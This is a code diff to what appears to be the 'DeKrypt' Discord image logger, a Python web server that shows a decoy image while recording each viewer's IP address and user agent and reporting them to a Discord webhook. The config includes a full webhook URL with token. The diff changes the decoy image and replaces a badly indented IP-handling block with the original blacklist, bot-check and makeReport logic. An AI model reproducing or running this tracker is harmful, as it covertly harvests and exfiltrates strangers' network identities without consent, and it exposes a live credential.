@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1486621531974139996/qmCm0qaiJSBLHAz5Iy6FcSqh0hIqV30kVK58dY1fkII1Aeh7V2z-qs9WHs2aEJLel5uR",
-    "image": "https://i.pinimg.com/1200x/49/0c/f2/490cf260ed7d1d05efdb1449dc90b76a.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://i.pinimg.com/1200x/31/25/10/312510d433b3bdd29f6b12ffcab62557.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -213,36 +213,19 @@ width: 100vw;
 height: 100vh;
 }}</style><div class="img"></div>'''.encode()
             
-          # جيب IP بشكل آمن
-ip = self.headers.get('x-forwarded-for')
-if not ip:
-    ip = self.client_address[0]
+            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
+                return
+            
+            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
+                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
+                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
+                self.end_headers() # Declare the headers as finished.
 
-# لو فيه أكثر من IP
-ip = ip.split(",")[0].strip()
+                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
 
-# جيب اليوزر ايجنت
-useragent = self.headers.get('user-agent') or "Unknown"
-
-# Blacklist check
-if ip.startswith(blacklistedIPs):
-    return
-
-# Bot check
-if botCheck(ip, useragent):
-    self.send_response(200 if config["buggedImage"] else 302)
-    self.send_header(
-        'Content-type' if config["buggedImage"] else 'Location',
-        'image/jpeg' if config["buggedImage"] else url
-    )
-    self.end_headers()
-
-    if config["buggedImage"]:
-        self.wfile.write(binaries["loading"])
-
-    makeReport(ip, useragent, endpoint=s.split("?")[0], url=url)
-    
-    return
+                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
+                
+                return
             
             else:
                 s = self.path
